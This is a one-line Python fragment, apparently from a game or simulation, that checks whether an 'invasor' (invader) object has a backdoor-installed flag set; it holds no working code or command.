             if invasor.backdoor_instalado:
